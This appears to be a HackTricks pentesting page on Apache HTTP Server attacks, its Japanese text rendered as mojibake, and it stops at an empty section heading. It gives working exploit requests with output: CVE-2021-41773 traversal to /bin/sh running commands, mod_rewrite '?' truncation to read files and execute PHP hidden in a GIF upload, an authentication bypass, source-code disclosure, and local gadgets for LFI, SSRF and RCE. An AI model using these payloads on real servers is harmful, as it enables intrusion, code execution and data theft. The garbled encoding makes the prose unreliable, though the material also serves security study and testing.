# Apache

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## å®Ÿè¡Œå¯èƒ½ãªPHPæ‹¡å¼µ

Apacheã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã—ã¦ã„ã‚‹æ‹¡å¼µã‚’ç¢ºèªã—ã¾ã™ã€‚ãã‚Œã‚‰ã‚’æ¤œç´¢ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
ã¾ãŸã€ã“ã®è¨­å®šã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹å ´æ‰€ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## æ··ä¹±æ”»æ’ƒ <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

ã“ã‚Œã‚‰ã®æ”»æ’ƒã¯[**Orangeã®ã“ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)ã§ç´¹ä»‹ã•ã‚Œã€æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ "æ··ä¹±"æ”»æ’ƒã¯åŸºæœ¬çš„ã«ã€Apacheã‚’ä½œæˆã™ã‚‹ãŸã‚ã«å”åŠ›ã™ã‚‹æ•°åã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒå®Œå…¨ã«åŒæœŸã—ã¦ã„ãªã„ã“ã¨ã‚’æ‚ªç”¨ã—ã€ãã®ä¸­ã®ã„ãã¤ã‹ãŒäºˆæœŸã—ãªã„ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€å¾Œã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã«è„†å¼±æ€§ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒ•ã‚¡ã‚¤ãƒ«åã®æ··ä¹±

#### åˆ‡ã‚Šæ¨ã¦

**`mod_rewrite`**ã¯ã€`r->filename`ã®å†…å®¹ã‚’`?`ã®å¾Œã§åˆ‡ã‚Šæ¨ã¦ã¾ã™ï¼ˆ[_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)ï¼‰ã€‚ã“ã‚Œã¯å®Œå…¨ã«é–“é•ã£ã¦ã„ã‚‹ã‚ã‘ã§ã¯ãªãã€ã»ã¨ã‚“ã©ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯`r->filename`ã‚’URLã¨ã—ã¦æ‰±ã„ã¾ã™ã€‚ã—ã‹ã—ã€ä»–ã®å ´é¢ã§ã¯ã“ã‚ŒãŒãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€å•é¡Œã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* **ãƒ‘ã‚¹ã®åˆ‡ã‚Šæ¨ã¦**

ä»¥ä¸‹ã®ãƒ«ãƒ¼ãƒ«ã®ä¾‹ã®ã‚ˆã†ã«`mod_rewrite`ã‚’æ‚ªç”¨ã—ã¦ã€æœŸå¾…ã•ã‚Œã‚‹ãƒ‘ã‚¹ã®æœ€å¾Œã®éƒ¨åˆ†ã‚’å‰Šé™¤ã—ã€å˜ã«`?`ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ä»–ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#Â the output of file `/var/user/orange/secret.yml`
```
* **èª¤è§£ã‚’æ‹›ãRewriteFlagã®å‰²ã‚Šå½“ã¦**

æ¬¡ã®ãƒªãƒ©ã‚¤ãƒˆãƒ«ãƒ¼ãƒ«ã§ã¯ã€URLãŒ.phpã§çµ‚ã‚ã‚‹é™ã‚Šã€ãã‚Œã¯phpã¨ã—ã¦æ‰±ã‚ã‚Œã€å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€`?`æ–‡å­—ã®å¾Œã«.phpã§çµ‚ã‚ã‚‹URLã‚’é€ä¿¡ã—ã€ãƒ‘ã‚¹ã«æ‚ªæ„ã®ã‚ã‚‹phpã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚ŒãŸåˆ¥ã®ã‚¿ã‚¤ãƒ—ã®ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆç”»åƒãªã©ï¼‰ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACLãƒã‚¤ãƒ‘ã‚¹**

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ã‚¯ã‚»ã‚¹ã‚’æ‹’å¦ã•ã‚Œã‚‹ã¹ããƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ãªè¨­å®šã§ç™ºç”Ÿã—ã¾ã™:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
ã“ã‚Œã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§PHP-FPMãŒ`.php`ã§çµ‚ã‚ã‚‹URLã‚’å—ã‘å–ã‚‹ãŸã‚ã§ã™ã€‚ä¾‹ãˆã°ã€`http://server/admin.php%3Fooo.php`ã®ã‚ˆã†ã«ã€PHP-FPMã¯`?`ã®å¾Œã®ã™ã¹ã¦ã‚’å‰Šé™¤ã™ã‚‹ãŸã‚ã€å‰ã®ãƒ«ãƒ¼ãƒ«ãŒãã‚Œã‚’ç¦æ­¢ã—ã¦ã„ã¦ã‚‚ã€å‰ã®URLã¯`/admin.php`ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Apacheã«é–¢ã™ã‚‹é¢ç™½ã„äº‹å®Ÿã¯ã€ä»¥å‰ã®ãƒªãƒ©ã‚¤ãƒˆãŒdocumentRootã¨ãƒ«ãƒ¼ãƒˆã®ä¸¡æ–¹ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€`https://server/abouth.html`ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®`/var/www/html/about.html`ã¨`/about.html`ã®ä¸¡æ–¹ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### **ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©**

* **CGIã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®æ¼æ´©**

æœ«å°¾ã«%3Fã‚’è¿½åŠ ã™ã‚‹ã ã‘ã§ã€cgiãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒæ¼æ´©ã—ã¾ã™ï¼š
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **PHPã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®é–‹ç¤º**

ã‚µãƒ¼ãƒãƒ¼ã«ç•°ãªã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ãŒã‚ã‚Šã€ãã®ã†ã¡ã®1ã¤ãŒé™çš„ãƒ‰ãƒ¡ã‚¤ãƒ³ã§ã‚ã‚‹å ´åˆã€ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’æ¨ªæ–­ã—ã€phpã‚³ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ“ä½œ**

å‰ã®æ”»æ’ƒã®ä¸»ãªå•é¡Œã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã»ã¨ã‚“ã©ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒæ‹’å¦ã•ã‚Œã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯Apache HTTP Serverã®[è¨­å®šãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)ã«ç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
ã—ã‹ã—ã€[Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ `/usr/share` ã‚’è¨±å¯ã—ã¦ã„ã¾ã™ï¼š
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®ãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã® `/usr/share` å†…ã«ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ **æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚**

**æƒ…å ±æ¼æ´©ã®ãŸã‚ã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* **websocketd** ã‚’ä½¿ç”¨ã—ãŸ **Apache HTTP Server** ã¯ã€**/usr/share/doc/websocketd/examples/php/** ã«ã‚ã‚‹ **dump-env.php** ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å…¬é–‹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€æ©Ÿå¯†ã®ç’°å¢ƒå¤‰æ•°ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* **Nginx** ã¾ãŸã¯ **Jetty** ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¦ã‚§ãƒ–ãƒ«ãƒ¼ãƒˆã«é…ç½®ã•ã‚ŒãŸæ©Ÿå¯†ã®ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³æƒ…å ±ï¼ˆä¾‹ï¼š**web.xml**ï¼‰ã‚’å…¬é–‹ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**XSSã®ãŸã‚ã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* **LibreOffice** ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸ Ubuntu Desktop ã§ã¯ã€ãƒ˜ãƒ«ãƒ—ãƒ•ã‚¡ã‚¤ãƒ«ã®è¨€èªåˆ‡ã‚Šæ›¿ãˆæ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ **ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚° (XSS)** ãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**/usr/share/libreoffice/help/help.html** ã§ URL ã‚’æ“ä½œã™ã‚‹ã“ã¨ã§ã€æ‚ªæ„ã®ã‚ã‚‹ãƒšãƒ¼ã‚¸ã‚„å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**LFIã®ãŸã‚ã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* PHP ã¾ãŸã¯ **JpGraph** ã‚„ **jQuery-jFeed** ã®ã‚ˆã†ãªç‰¹å®šã®ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ‚ªç”¨ã—ã¦ **/etc/passwd** ã®ã‚ˆã†ãªæ©Ÿå¯†ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**SSRFã®ãŸã‚ã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* **MagpieRSSã®magpie\_debug.php** ã‚’ **/usr/share/php/magpierss/scripts/magpie\_debug.php** ã§åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€SSRF è„†å¼±æ€§ã‚’ç°¡å˜ã«ä½œæˆã§ãã€ã•ã‚‰ãªã‚‹æ”»æ’ƒã¸ã®ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤ã‚’æä¾›ã—ã¾ã™ã€‚

**RCEã®ãŸã‚ã®ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**

* **ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ (RCE)** ã®æ©Ÿä¼šã¯åºƒç¯„ã§ã€å¤ã„ **PHPUnit** ã‚„ **phpLiteAdmin** ã®ã‚ˆã†ãªè„†å¼±ãªã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ãŒå­˜åœ¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ“ä½œã®åºƒç¯„ãªå¯èƒ½æ€§ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

#### **ãƒ­ãƒ¼ã‚«ãƒ«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‹ã‚‰ã®è„±ç„**

ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚ŒãŸã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’ãŸã©ã‚‹ã“ã¨ã§ã€è¨±å¯ã•ã‚ŒãŸãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰è„±ç„ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ï¼š

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

ã•ã‚‰ã«ã€ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ **Redmine ã§ã® RCE ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚**

### ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã®æ··ä¹± <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

ã“ã®æ”»æ’ƒã¯ã€`AddHandler` ã¨ `AddType` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–é–“ã®æ©Ÿèƒ½ã®é‡è¤‡ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã©ã¡ã‚‰ã‚‚ **PHP å‡¦ç†ã‚’æœ‰åŠ¹ã«ã™ã‚‹** ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚å…ƒã€…ã€ã“ã‚Œã‚‰ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã‚µãƒ¼ãƒãƒ¼ã®å†…éƒ¨æ§‹é€ ã®ç•°ãªã‚‹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ï¼ˆãã‚Œãã‚Œ `r->handler` ã¨ `r->content_type`ï¼‰ã«å½±éŸ¿ã‚’ä¸ãˆã¦ã„ã¾ã—ãŸã€‚ã—ã‹ã—ã€ãƒ¬ã‚¬ã‚·ãƒ¼ã‚³ãƒ¼ãƒ‰ã®ãŸã‚ã€Apache ã¯ç‰¹å®šã®æ¡ä»¶ä¸‹ã§ã“ã‚Œã‚‰ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ç›¸äº’ã«å‡¦ç†ã—ã€å‰è€…ãŒè¨­å®šã•ã‚Œã¦ã„ã¦å¾Œè€…ãŒè¨­å®šã•ã‚Œã¦ã„ãªã„å ´åˆã€`r->content_type` ã‚’ `r->handler` ã«å¤‰æ›ã—ã¾ã™ã€‚

ã•ã‚‰ã«ã€Apache HTTP Server (`server/config.c#L420`) ã§ã¯ã€`ap_run_handler()` ã‚’å®Ÿè¡Œã™ã‚‹å‰ã« `r->handler` ãŒç©ºã§ã‚ã‚‹å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ **`r->content_type` ã‚’ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã¨ã—ã¦ä½¿ç”¨ã—ã¾ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€`AddType` ã¨ `AddHandler` ã¯åŠ¹æœçš„ã«åŒä¸€ã«ãªã‚Šã¾ã™ã€‚

#### **PHP ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’é–‹ç¤ºã™ã‚‹ãŸã‚ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã®ä¸Šæ›¸ã**

[**ã“ã®è¬›æ¼”**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf) ã§ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ã‚ˆã£ã¦é€ä¿¡ã•ã‚ŒãŸä¸æ­£ãª `Content-Length` ãŒ Apache ã«èª¤ã£ã¦ **PHP ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã•ã›ã‚‹** è„†å¼±æ€§ãŒæç¤ºã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã¯ã€ModSecurity ã¨ Apache Portable Runtime (APR) ã®ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã®å•é¡Œã«ã‚ˆã‚‹ã‚‚ã®ã§ã€äºŒé‡å¿œç­”ãŒ `r->content_type` ã‚’ `text/html` ã«ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã«ã¤ãªãŒã‚Šã¾ã™ã€‚\
ModSecurity ãŒæˆ»ã‚Šå€¤ã‚’é©åˆ‡ã«å‡¦ç†ã—ãªã„ãŸã‚ã€PHP ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã—ã€ãã‚Œã‚’è§£é‡ˆã—ã¾ã›ã‚“ã€‚

#### **XXXX ã®ãŸã‚ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã®ä¸Šæ›¸ã**

TODO: Orange ã¯ã¾ã ã“ã®è„†å¼±æ€§ã‚’é–‹ç¤ºã—ã¦ã„ã¾ã›ã‚“

### **ä»»æ„ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã‚’å‘¼ã³å‡ºã™**

æ”»æ’ƒè€…ãŒã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã§ **`Content-Type`** ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã€**ä»»æ„ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹** ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã—ã‹ã—ã€æ”»æ’ƒè€…ãŒã“ã‚Œã‚’åˆ¶å¾¡ã™ã‚‹æ™‚ç‚¹ã§ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã»ã¨ã‚“ã©ã®å‡¦ç†ã¯å®Œäº†ã—ã¦ã„ã¾ã™ã€‚ãŸã ã—ã€**`Location` ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ‚ªç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ—ãƒ­ã‚»ã‚¹ã‚’å†èµ·å‹•ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚ãªãœãªã‚‰ã€**r** ãŒè¿”ã•ã‚ŒãŸ `Status` ãŒ 200 ã§ã€`Location` ãƒ˜ãƒƒãƒ€ãƒ¼ãŒ `/` ã§å§‹ã¾ã‚‹å ´åˆã€å¿œç­”ã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã¨ã—ã¦æ‰±ã‚ã‚Œã€å‡¦ç†ã•ã‚Œã‚‹ã¹ãã ã‹ã‚‰ã§ã™ã€‚

[RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875)ï¼ˆCGI ã«é–¢ã™ã‚‹ä»•æ§˜ï¼‰ã«ã‚ˆã‚‹ã¨ã€[ã‚»ã‚¯ã‚·ãƒ§ãƒ³ 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) ã§ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆå¿œç­”ã®å‹•ä½œãŒå®šç¾©ã•ã‚Œã¦ã„ã¾ã™ï¼š

> CGI ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒªã‚½ãƒ¼ã‚¹ã®ãŸã‚ã® URI ãƒ‘ã‚¹ã¨ã‚¯ã‚¨ãƒªæ–‡å­—åˆ—ï¼ˆâ€˜local-pathqueryâ€™ï¼‰ã‚’ Location ãƒ˜ãƒƒãƒ€ãƒ¼ ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã§è¿”ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚µãƒ¼ãƒãƒ¼ã«æŒ‡å®šã•ã‚ŒãŸãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å†å‡¦ç†ã™ã‚‹ã‚ˆã†æŒ‡ç¤ºã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®è„†å¼±æ€§ãŒå¿…è¦ã§ã™ï¼š

* CGI å¿œç­”ãƒ˜ãƒƒãƒ€ãƒ¼ã§ã® CRLF ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
* å¿œç­”ãƒ˜ãƒƒãƒ€ãƒ¼ã®å®Œå…¨ãªåˆ¶å¾¡ã‚’ä¼´ã† SSRF

#### **æƒ…å ±æ¼æ´©ã®ãŸã‚ã®ä»»æ„ã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼**

